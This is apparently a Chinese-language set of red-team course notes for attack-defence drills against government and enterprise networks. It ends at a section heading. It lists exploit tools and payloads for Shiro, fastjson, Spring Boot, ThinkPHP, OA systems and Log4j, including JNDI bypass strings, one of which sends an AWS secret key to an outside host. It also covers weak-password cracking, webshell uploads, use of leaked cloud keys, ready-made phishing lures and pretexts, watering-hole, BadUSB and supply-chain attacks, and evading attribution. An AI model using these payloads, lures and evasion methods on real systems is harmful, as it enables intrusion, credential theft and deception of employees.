<p>政府部门类企业由于归集化管理方法，尤其是企业网站基本上全部都是站群软件方法，由省市区的网络信息中心承担统建，统一化聚集布署在云数据中心服务平台上，各企业仅仅有着后台管理的应用管理权限。因此 针对政府部门类靶点我们一般把资产区划为:<br>•云数据中心代管类（通常为企业网站）<br>•已有计算机房类资产（通常为0A、电子邮箱、财务管理系统等里面协同办公系统及其VPN）<br>•外界代管资产（通常为微信小程序或是微信公众号）。</p>
<p>云数据中心代管类资产<br>通常省市区的网络信息中心全部都是巨资资金投入，从通道刚开始一长串机器设备（WAF、NGFW、三层交换机、DLP、进来以后也有天眼、EDR这类的），在战备值班期内每个机器设备生产商基本上都是会被拉回来二十四小时值班，因此 此类总体目标通常在比较有限时长内全部都是先绕开，确实搜集不上外面资产才绕过来硬刚。</p>
<p><strong>蜜罐介绍</strong></p>
<p>蜜罐可以理解为安全攻防中的陷阱，通过在信息系统中的各个环境或者网络中部署一些特定协议服务或者组件来诱导恶意行为对其进行探测或利用，从而达到发现恶意攻击、横向移动、内网失陷事件的目的。常见的蜜罐类型一般会包括以下几种：<br>•低交互式蜜罐 ：通常是指与操作系统交互程度较低的蜜罐系统，仅开放一些简单的服务或端口，用来检测扫描和连接，这种容易被识别。<br>•中交互式蜜罐 ：介于低交互式和高交互式之间，能够模拟操作系统更多的服务，让攻击者看起来更像一个真实的业务，从而对它发动攻击，这样蜜罐就能获取到更多有价值的信息。<br>•高交互式 ：指的是与操作系统交互很高的蜜罐，它会提供一个更真实的环境，这样更容易吸引入侵者，有利于掌握新的攻击手法和类型，但同样也会存在隐患，会对真实网络造成攻击<br>常见场景:<br>攻击队员通过社交工具传递目标可疑URL时，如果误点击通过系统默认的浏览器打开，则可能会被JSONP蜜罐捕获社交账号或者被抓到真实出口IP。</p>
<p>蜜罐简单识别<br>•网站是否存在大量请求其他域资源;<br>•网站是否对于各大社交网站发送请求；<br>•网站是否存在大量请求资源报错,克隆其他站时没有修改完成;<br>•存在⾮常多漏洞的站点，拿到shell后处于docker等虚拟环境，开放⼤量⾼危端⼝的;<br>•获取到PC机器后，PC机器⽤户⻓时间划⽔摸⻥;<br>•从目标获取的文件需要在沙箱或断网虚拟机运行，避免被反制</p>
<p><strong>反溯源</strong></p>
<p>作为应对，攻击方必须使用纯净的专用渗透环境进行攻击，完全与日常工作环境区分开来，并做测试环境的定期还原。<br>•VPN、匿名代理<br>•纯净的渗透环境、虚拟机<br>•匿名邮箱、手机号、VPS等<br>•纯净的移动设备、无线设备等</p>
<p>反jsonp蜜罐插件<br>判断当前网站域和jsonp接口的域是否是同一个，是的话就预警并阻断。<br>•<a target="_blank" rel="noopener" href="https://github.com/iiiusky/AntiHoneypot-Chrome-simple">https://github.com/iiiusky/AntiHoneypot-Chrome-simple</a><br>•<a target="_blank" rel="noopener" href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161111167.png" alt="image-20220707161111167"></p>
<p><strong>概述</strong></p>
<p>攻防演练中得分项只关注两点，权限&amp;数据：权限类型分为系统权限和应用权限，权限高低又分为管理员权限和普通用户权限。数据一般是要四件套，姓名，手机号，身份证，住址。通常敏感数据这样定义，不过看当前的应用可能敏感信息的定义又会不同在攻防的时候，比的就是谁能发现弱点资产快，其实也是比三大块：<br>•0day利用<br>•1day利用<br>•常见WEB漏洞</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161156102.png" alt="image-20220707161156102"></p>
<hr>
<p><strong>弱口令</strong></p>
<p>系统的弱口令是常见的入口点之一，不论是web还是如VPN、堡垒机、边界路由器防火墙一类，以及结合特定公司场景、业务场景生成的弱口令的情况。可能存在未授权访问类的服务<br>•远程维护类服务（SSH、Tenlent、RDP 等）；<br>•数据库服务（MySQL、MSSQL、Oracle 、ES、MongoDB 等）；<br>•缓存类服务（Redis、Kafka）；<br>•大数据相关服务；<br>•云环境各类接口、Docker 环境各类接口；<br>•各种 Web 应用系统、手机程序、小程序等。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161237044.png" alt="image-20220707161237044"></p>
<p>密码组合方式<br>•有社工密码可以根据之前的密码使用历史记录针对性的生成组合。<br>•部门的密码使用习惯，趋于一致。<br>•有含义字符@有含义数字，如`姓名全拼@2017</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161259279.png" alt="image-20220707161259279"></p>
<p>弱口令的关键在于字典，一个好字典发挥的作用很可能超出预期，哪怕是边界网络设备的弱口令，也可能会打开直达内网的通路。比较推荐的一些字典：<br>•<a target="_blank" rel="noopener" href="https://github.com/fuzz-security/SuperWordlist">https://github.com/fuzz-security/SuperWordlist</a><br>•<a target="_blank" rel="noopener" href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Stardustsky/SaiDict">https://github.com/Stardustsky/SaiDict</a><br>•<a target="_blank" rel="noopener" href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a><br>•<a target="_blank" rel="noopener" href="https://github.com/k8gege/PasswordDic">https://github.com/k8gege/PasswordDic</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ybdt/dict-hub">https://github.com/ybdt/dict-hub</a><br>web通用弱口令破解脚本，旨在批量检测那些没有验证码的管理后台<br>•<a target="_blank" rel="noopener" href="https://github.com/TideSec/web_pwd_common_crack">https://github.com/TideSec/web_pwd_common_crack</a></p>
<p>爆破工具<br>Burp Intruder<br>•经常遇到一些客户端 js 文件对密码做加密处理发送给服务端的情况，推荐扩展<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a><br>•验证码识别:<a target="_blank" rel="noopener" href="https://github.com/bit4woo/reCAPTCHA">https://github.com/bit4woo/reCAPTCHA</a><br>超级弱口令检查工具<br>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a><br>Hydra<br>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
<hr>
<p><strong>高危组件</strong></p>
<p>•struct2 (s2系列rce)<br>•thinkphp系列 (tp2x,3x,5x的代码执行等)<br>•shiro,fastjson组件反序列化<br>•Jekins (未授权访问，命令执行等)<br>•weblogic (CVE-2020-2551，CVE-2019-2729等)<br>•Jboss (反序列化CVE-2015-7501,CVE-2017-7504,CVE-2017-12149)<br>•各类开源cms的漏洞 (如wordpress，drupal ，discuz，joomla, 帝国cms，织梦cms等)<br>•常见编辑器的历史漏洞 (如ueditor编辑器解析漏洞，各种越权和后台地址泄露等)<br>•常见OA漏洞 (用友，泛微，致远，金蝶等)<br>•各种网关防火墙nday，redis未授权，mongodb未授权等</p>
<hr>
<p><strong>高危组件(Shiro)</strong></p>
<p>Shiro反序列化<br>shiro反序列化RCE是在实战中一个比较高频且舒适的漏洞，shiro框架在java web登录认证中广泛应用，每一次目标较多的情况下几乎都可以遇见shiro，而因其payload本身就是加密的，无攻击特征，所以几乎不会被waf检测和拦截。<br>shiro框架特征<br>•在请求包cookie中带有rememberMe=1字段<br>•在返回包的 Set-Cookie中存在rememberMe=deleteMe字段<br>Shiro主要漏洞方向：<br>•Shiro 反序列化 RCE<br>•Shiro 身份验证绕过<br>实战中可能遇到的问题：获得key&amp;回显&amp;内存shell</p>
<p>Shiro组件检测<br>•<a target="_blank" rel="noopener" href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a><br>•Fofa/hunter/quake<br>•指纹识别工具<br>利用：<br>•<a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a><br>•<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/shiro_rce_tool">https://github.com/wyzxxz/shiro_rce_tool</a><br>•<a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a><br>•<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
<p>Shiro 身份验证绕过<br>利用shiro解析uri和spring解析uri之间存在差异来绕过身份验证。URL中加/;/<br>•目标访问地址：/xxx/hello/aaaa<br>•发起请求地址：/;/xxx/hello/aaaa<br>如果能够知道后台各种接口的URL拼接即可绕过身份认证，未授权访问</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161537654.png" alt="image-20220707161537654"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161556728.png" alt="image-20220707161556728"></p>
<hr>
<p><strong>高危组件(fastjson)</strong></p>
<p>FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。在Java 8u102环境下，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p>
<p>探测：<br>用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。<br>•{“@type”:”java.net.URL”,”val”:”<a target="_blank" rel="noopener" href="http://dnslog&quot;}/">http://dnslog&quot;}</a><br>•{“@type”:”java.net.InetAddress”,”val”:”dnslog”}<br>•{“@type”:”java.net.Inet4Address”,”val”:”dnslog”}<br>利用:<br>•<a target="_blank" rel="noopener" href="https://github.com/pmiaowu/BurpFastJsonScan">https://github.com/pmiaowu/BurpFastJsonScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a><br>•<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a></p>
<hr>
<p><strong>高危组件(Springboot)</strong></p>
<p>Spring Boot框架，作用很简单，就是帮我们自动配置，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。<br>Actuator是Spring Boot提供的服务监控和管理工具。当Spring Boot应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些敏感信息泄露。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161737987.png" alt="image-20220707161737987"></p>
<p>配置不当而暴露的路由<br>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置:<br>•<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints</a><br>•<a target="_blank" rel="noopener" href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt</a><br>探测:<br>•目录扫描工具+springboot字典<br>利用:<br>•<a target="_blank" rel="noopener" href="https://github.com/0x727/SpringBootExploit![image-20220707161816788](./HW%E8%AF%BE%E7%A8%8B/image-20220707161816788.png)">https://github.com/0x727/SpringBootExploit![image-20220707161816788](./HW%E8%AF%BE%E7%A8%8B/image-20220707161816788.png)</a></p>
<p>•/env、/actuator/envGET<br>请求 /env会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 /env接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。<br>•/refresh、/actuator/refreshPOST<br>请求 /env接口设置属性后，可同时配合 POST 请求/refresh接口刷新属性变量来触发相关 RCE 漏洞。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161900475.png" alt="image-20220707161900475"></p>
<p>•/restart、/actuator/restart<br>暴露出此接口的情况较少；可以配合 POST请求/env接口设置属性后，再 POST 请求 /restart接口重启应用来触发相关 RCE 漏洞。<br>•/jolokia、/actuator/jolokia<br>可以通过 /jolokia/list接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。<br>•/trace、/actuator/httptrace<br>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161942288.png" alt="image-20220707161942288"></p>
<p>Sprint Boot漏洞<br>•whitelabel error page SpEL RCE<br>Env端点<br>•SpringBoot env 获取* 敏感信息<br>•spring Cloud env yaml利用<br>•xstream反序列化<br>Jolokia漏洞<br>•jolokia logback JNDI RCE<br>•jolokia Realm JNDI RCE<br>更多参考:<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
<hr>
<p><strong>高危组件(thinkphp)</strong></p>
<p>ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache 2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162101727.png" alt="image-20220707162101727"></p>
<p>Thinkphp5 rce分两个大版本<br>•ThinkPHP 5.0-5.0.24<br>•ThinkPHP 5.1.0-5.1.30<br>方法主要分为两种:<br>•Request中的filter变量覆盖导致RCE分开启debug和不开启debug 两种情况<br>•路由控制不严谨导致的RCE<br>利用<br>•<a target="_blank" rel="noopener" href="https://github.com/Lotus6/ThinkphpGUI">https://github.com/Lotus6/ThinkphpGUI</a><br>•<a target="_blank" rel="noopener" href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a><br>•<a target="_blank" rel="noopener" href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a></p>
<hr>
<p><strong>高危组件(Log4j2)</strong></p>
<p>CVE-2021-44228(lookup JNDI 注入漏洞)<br>Apache Log4j是一个基于Java的日志记录组件。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。Apache Log4j的默认配置支持JNDI（Java命名和目录接口）查询，可以执行由LDAP、RMI和DNS等远程服务提供的任意代码。<br>•受影响的版本：从2.0-beta9到2.12.1和2.13.0到2.14.1的所有版本</p>
<p>此次 Apache Log4j2 漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162223685.png" alt="image-20220707162223685"></p>
<p>Vulhub漏洞复现<br>•solr/admin/cores?action=${jndi:ldap://${sys:java.version}.n93jx9.ceye.io}</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162243795.png" alt="image-20220707162243795"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220708223632385.png" alt="image-20220708223632385"></p>
<p>漏洞探测<br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/fullhunt/log4j-scan">https://github.com/fullhunt/log4j-scan</a><br>使用方法<br>•python3 log4j-scan.py -h<br>•扫描单个URL<br>•python3 log4j-scan.py -u <a target="_blank" rel="noopener" href="https://xxx.com/">https://xxx.com</a><br>•使用所有请求方法扫描单个URL：GET、POST（URL 编码形式）、POST（JSON body）<br>•python3 log4j-scan.py -u <a target="_blank" rel="noopener" href="https://log4j.lab.secbot.local/">https://log4j.lab.secbot.local</a> –run-all-tests</p>
<p>BurpLog4j2Scan<br>•burpLog4j2Scan 是用 JAVA 编写的 Burp Suite 扩展，可用作扫描 log4j2rce。<br>•<a target="_blank" rel="noopener" href="https://github.com/tangxiaofeng7/BurpLog4j2Scan.git">https://github.com/tangxiaofeng7/BurpLog4j2Scan.git</a><br>Log4j2Scan<br>•<a target="_blank" rel="noopener" href="https://github.com/whwlsfb/Log4j2Scan.git">https://github.com/whwlsfb/Log4j2Scan.git</a><br>Log4j2 远程代码执行漏洞，BurpSuite被动扫描插件。支持精确提示漏洞参数、漏洞位置，支持多dnslog平台扩展、自动忽略静态文件。<br>漏洞检测暂只支持以下类型<br>•Url<br>•Cookie<br>•Header<br>•Body(x-www-form-urlencoded)</p>
<p>关键字绕过<br>•${jndi:dns://aeutbj.example.com/ext}<br>•${jndi:${lower:l}${lower:d}a${lower:p}://example.com/<br>•${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}<br>•iiop://这个协议老外发现但是未证实可用<br>转换大小写绕过<br>${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}<br>${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162351899.png" alt="image-20220707162351899"></p>
<hr>
<p><strong>OA系统</strong></p>
<p>•泛微(Weaver-Ecology-OA)<br>•致远(Seeyon)<br>•蓝凌OA<br>•通达OA(TongDa OA)<br>•红帆OA<br>•金和OA<br>•金蝶OA<br>•信呼OA<br>•…….</p>
<p>快速定位<br>•官网链接<br>•测绘引擎<br>•指纹识别<br>利用工具<br>•<a target="_blank" rel="noopener" href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Yang0615777/PocList">https://github.com/Yang0615777/PocList</a><br>•<a target="_blank" rel="noopener" href="https://github.com/z1un/weaver_exp">https://github.com/z1un/weaver_exp</a><br>•<a target="_blank" rel="noopener" href="https://github.com/haibara3839/LandrayExploit">https://github.com/haibara3839/LandrayExploit</a><br>•<a target="_blank" rel="noopener" href="https://github.com/asdasdqkq1/yonyou-nc-exp">https://github.com/asdasdqkq1/yonyou-nc-exp</a></p>
<p>以通达OA为例，常用到的小技巧:<br>•http[s]://TongDaOA.domain/inc/expired.php 判断通达版本<br>•http[s]://TongDaOA.domain/inc/reg_trial.php<br>•http[s]://TongDaOA.domain/inc/reg_trial_submit.php<br>•http[s]://TongDaOA.domain/resque/worker.php 计算机名<br>HW中常用到的漏洞:<br>•通达OA版本&lt;v11.5&amp;11.7任意用户登陆漏洞<br>•11.7后台SQL注入漏洞<br>•文件包含&amp;文件上传Getshell（慎用)<br>•redis+SSRF组合拳后台getshell<br>•文件上传.user.ini后台getshell（v11.8可用)</p>
<hr>
<p><strong>注入</strong></p>
<p>通过注入可以拓展很多思路，因为数据库基本上都实现了读写文件的操作，执行命令也可以通过拓展或者系统自带的存储过程来实现。限制我们的更多的是权限的问题.<br>•哪里会经常出现注入<br>•bypass waf<br>•如何快速定位重要数据表<br>•大数据表脱数据(慎重)<br>•注入读写文件<br>•执行命令<br>•站库分离情况<br>高校类的站点有很多Asp和PHP的网站，在登录、注册、查询功能处存在SQL注入漏洞可能性较大</p>
<p>bypass waf<br>关键在于需要清楚他拦截的是你payload的哪一部分<br>•<a target="_blank" rel="noopener" href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI</a><br>•<a target="_blank" rel="noopener" href="https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI</a><br>快速定位重要数据表<br>sqlmap有一个参数叫做–search，可以用来搜索列、表或数据库名称。<br>• –search -D：搜索某个数据库<br>• –search -T：搜索某个表名<br>• –search -C：搜索某个字段名<br>通过搜索形如username、password的字段即可快速定位重要数据表。</p>
<p>Mysql 的 getshell 方法<br>•SELECT…INTO OUTFILE<br>•general_log<br>•slow_query_log<br>•phpMyAdmin<br>Mssql的getshell方法<br>•xp_cmdshell拿shell<br>•差异备份拿shell<br>•log备份拿shell</p>
<hr>
<p><strong>通用文件上传</strong></p>
<p>需要注意的一些点<br>•判断服务器类型+脚本语言<br>•判断是否有waf<br>•准备免杀webshell<br>•找到上传的webshell路径<br>•使用合适的webshell管理工具进行连接</p>
<hr>
<p><strong>敏感信息泄露</strong></p>
<p>敏感信息包括但不限于：口令、密钥、证书、会话标识、License、隐私数据、授权凭据、个人数据等、程序文件、配置文件、日志文件、备份文件等<br>•robots.txt<br>•.git敏感文件<br>•物理路径泄露<br>•报错页面敏感信息泄漏<br>•备份文件泄露<br>•目录浏览<br>•其他</p>
<p><strong>敏感信息泄露(swagger）</strong></p>
<p>Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化RESTful 风格的 Web 服务<br>常见路径：<br>•/swagger-ui.html<br>•/swagger/swagger-ui.html<br>•/api/swagger-ui.html<br>•/v1.x/swagger-ui.html<br>•/swagger/index.html<br>利用参考： <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xQUnTXo38x_jLWv5beOQ0Q">https://mp.weixin.qq.com/s/xQUnTXo38x_jLWv5beOQ0Q</a></p>
<p><strong>敏感信息泄露(云key泄露）</strong></p>
<p>accesskey<br>访问密钥AccessKey（AK）相当于登录密码，只是使用场景不同。AccessKey用于程序方式调用云服务API，而登录密码用于登录控制台。<br>accesskey泄露主要有两种途径：<br>•硬编码在代码里<br>•Github<br>•前端js<br>•第三方存储<br>•Env<br>•Debug报错</p>
<p>利用方式<br><a target="_blank" rel="noopener" href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br><a target="_blank" rel="noopener" href="https://github.com/iiiusky/alicloud-tools">https://github.com/iiiusky/alicloud-tools</a><br>•./AliCloud-Tools -a <AccessKey> -s <SecretKey> ecs –list #查看所有实例信息</SecretKey></AccessKey></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162838719.png" alt="image-20220707162838719"></p>
<p>通过云管平台获取权限<br>•用行云管家导入云主机，网站地址：<a target="_blank" rel="noopener" href="https://yun.cloudbility.com/">https://yun.cloudbility.com/</a></p>
<hr>
<p><strong>钓鱼邮件</strong></p>
<p>用伪装的电邮（不限于常见邮件，一些内部的oa，erp，或其他供员工使用交流带附件功能的系统亦可），附件携带excel宏病毒，或快捷方式类木马，亦或捆绑在正常软件中的木马等，发送给目标。<br>免杀推荐：<br><a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a><br><a target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a><br>捆绑推荐：<br><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/MatryoshkaDollTool">https://github.com/TheKingOfDuck/MatryoshkaDollTool</a><br>字典推荐：<br><a target="_blank" rel="noopener" href="https://github.com/sry309/SuperWordlist">https://github.com/sry309/SuperWordlist</a><br><a target="_blank" rel="noopener" href="https://github.com/cwkiller/Pentest_Dic">https://github.com/cwkiller/Pentest_Dic</a><br><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<p>宏(简历或其他)<br>投递方式使用docx简历，让受害者点击允许运行宏准备一份简历，背景为虚化的简历图片，在上方用蓝底白字加一段文字.<br>•Office:本文档看起来是低版本word编写。<br>为了完整显示此文档，请点击”启动编辑”和”启用宏内容”。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162933534.png" alt="image-20220707162933534"></p>
<p>商务合作<br>合作是一个公司必不可少的业务之一，我们可以在网站下方找一些合作邮箱，以合作的名义去进行合作邮件钓鱼。要注意的点是：公司尽量是和受害者公司同一区域的，如果随便找个区域的公司，并且所涉及的业务并未覆盖到受害者公司，很容易被无视。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162958084.png" alt="image-20220707162958084">]</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163012452.png" alt="image-20220707163012452"></p>
<p>很多公司都会在比如拉勾网、智联招聘进行工作招聘，这种情况下，我们也可以在这些第三方平台上，与面试者面对面的沟通交流，取得信任，最后进行钓鱼攻击</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163040786.png" alt="image-20220707163040786"></p>
<p>可信站点附件中转<br>我们进行钓鱼攻击时，会常常把木马直接放在邮件正文中，但是对方邮件网关可能有杀软沙箱，会拦截带有恶意文件的邮箱，这时候可以尝试对文件进行加密处理除了加密处理外，还可以使⽤可信站点作为中转，⽐如我准备钓⻥的员⼯是{domain}.com公司下的，那如果我们把附件传到*.{domain}.com域下的话，当对⽅看到下载地址是{domain}.com域的话，下载点击的成功率是不是更⼤了点呢？</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163113940.png" alt="image-20220707163113940"></p>
<p>放假通知<br>节假日前期可尝试该手段进行钓鱼</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163131206.png" alt="image-20220707163131206"></p>
<p>钓鱼安全演练通告<br>以钓鱼安全演练的名义，通告企业人员，存在安全意识薄弱的现象，更容易欺骗内部人员点击。<br>话术<br>•各位同事好：（时间，可以是上一次真实发送钓鱼邮件的时间）信息部协调第三方安全厂商做了一次钓鱼邮件安全演练，发现有部分同事安全意识薄弱，现在对此进行通告。 详情请查阅附件。<br>谢谢！<br>鱼饵投递方式<br>•exe、word宏等</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163202243.png" alt="image-20220707163202243"></p>
<hr>
<p><strong>水坑攻击</strong></p>
<p>页面植入JS，进一步获取内网主机权限。修改页面植入时需要申请，大概率不允许（拿到权限修改口令，修改配置文件，修改页面误导等操作）前台存储xss漏洞或者云上目标webshell但无法继续深入的情况下，可以考虑使用水坑攻击。在目标受害者经常访问的站点上部署木马诱惑目标下载执行上线。<br>Flash水坑+配合xss使用<br>•<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a><br>Pricking 是一个自动化部署水坑和网页钓鱼的项目。<br>•<a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/Pricking">https://github.com/Rvn0xsy/Pricking</a></p>
<hr>
<p><strong>BadUSB</strong></p>
<p>BadUSB是利用伪造HID设备执行攻击载荷的一种攻击方式。HID设备通常指的就是键盘鼠标等与人交互的设备，用户插入BadUSB，就会自动执行预置在固件中的恶意代码。Bad-Usb插入后，会模拟键盘鼠标对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载其他代码并于后台静默运行。这些代码功能包括：窃取信<br>息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。badUSB简单免杀一秒上线CobaltStrike<br>•<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ">https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ</a><br>Badusb初识<br>•<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6435">https://xz.aliyun.com/t/6435</a><br>BasUSB实现后台静默执行上线CobaltStrike<br>•<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw">https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw</a></p>
<hr>
<p><strong>供应链攻击</strong></p>
<p>供应链攻击是指一种传播间谍软件的方式，一般在开发工具、源代码、安装包下载、升级客户端时、厂商预留后门、传输链等环节上进行污染。通过篡改服务器这些组件进行侵入并植入病毒或恶意代码传播将恶意软件传播给前往官网下载软件的用户。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707163323554.png" alt="image-20220707163323554"></p>
<p>•攻击供应链-&gt;注入恶意代码(应用、app)–&gt;访问某个IP地址–&gt;下载主体恶意程序–&gt;实现远程控制<br>•直接篡改应用源代码(载入木马)–&gt;下发用户–&gt;用户使用-&gt;访问某个IP地址–&gt;下载主体恶意程序–&gt;实现远程控制<br>•直接篡改应用源代码（建立特权账户或端口服务）–&gt;用户使用 –&gt;被厂商（攻击者）利用 –&gt;访问某个IP地址-&gt;下载主体恶意程序-&gt;实现远程控制<br>•直接篡改应用源代码（篡改浏览器）–&gt;用户使用 –&gt;流量劫持–&gt;利用源代码直接进行远程控制<br>•用户使用升级更新–&gt;被劫持–&gt;下发恶意程序–&gt;访问某个IP地址–&gt;下载主体恶意程序–&gt;实现远程控制</p>
<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="提-权-相-关"><a href="#提-权-相-关" class="headerlink" title="提 权 相 关"></a>提 权 相 关</h2><p><strong>linux提权</strong></p>
